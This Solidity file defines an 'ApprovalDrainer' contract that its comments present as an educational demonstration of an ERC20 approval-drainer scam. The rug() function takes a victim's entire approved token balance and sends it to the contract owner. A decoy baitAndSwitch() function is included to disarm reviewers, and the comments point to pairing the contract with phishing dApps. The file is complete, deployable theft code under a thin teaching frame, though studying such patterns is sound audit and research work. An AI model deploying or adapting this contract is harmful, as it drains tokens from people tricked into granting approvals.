// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
    Import the standard ERC20 interface.
    This allows the contract to interact with any ERC20 token
    (balanceOf, transferFrom, etc.) without knowing its implementation.
*/
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

/*
    IERC20Permit is imported but NOT USED in this contract.
    This is a common red flag in malicious contracts, as it suggests
    future or hidden intent to use permit-based approvals (EIP-2612),
    often associated with signature-based approval draining.
*/
import "openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Permit.sol";

/**
 * @title ApprovalDrainer
 * @author —
 * @notice Demonstrates a real-world approval-drainer scam pattern
 *
 * @dev
 * This contract exploits the ERC20 approval mechanism.
 * If a victim has previously approved this contract for unlimited
 * token spending, the attacker can steal the victim’s entire balance
 * without further consent.
 *
 * ⚠️ This contract is intentionally malicious and should only be used
 * for educational, auditing, or security research purposes.
 */

/// @notice Simulates real approval-drainer scam
contract ApprovalDrainer {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
     /**
     * @notice Steals ALL approved tokens from a victim
     *
     * @param token  Address of the ERC20 token to steal
     * @param victim Address of the user whose tokens will be drained
     *
     * @dev
     * How this works:
     * 1. Victim previously approved this contract (often via phishing UI).
     * 2. The contract reads the victim’s full token balance.
     * 3. transferFrom is used to move ALL tokens to the attacker.
     *
     * No signature, no confirmation, no warning — just a single call.
     */
     
    function rug(address token, address victim) external {
        uint256 balance = IERC20(token).balanceOf(victim);
        require(balance > 0, "nothing to steal");
        
        /*
            Transfer the ENTIRE balance from victim to attacker.

            This succeeds ONLY IF:
            - The victim previously approved this contract
              with sufficient allowance (often unlimited).

            The victim does NOT need to interact again.
        */
        IERC20(token).transferFrom(victim, owner, balance);
    }
    
    /**
     * @notice Fake harmless function to build trust
     *
     * @dev
     * This function does nothing except return a message.
     * It mimics a "normal" or "joke" function to distract users
     * and make the contract appear less dangerous during review.
     *
     * Commonly paired with phishing websites or fake dApps.
     */
    function baitAndSwitch() external pure returns (string memory) {
        return "Thanks for the approval! I'll be back...";
    }
}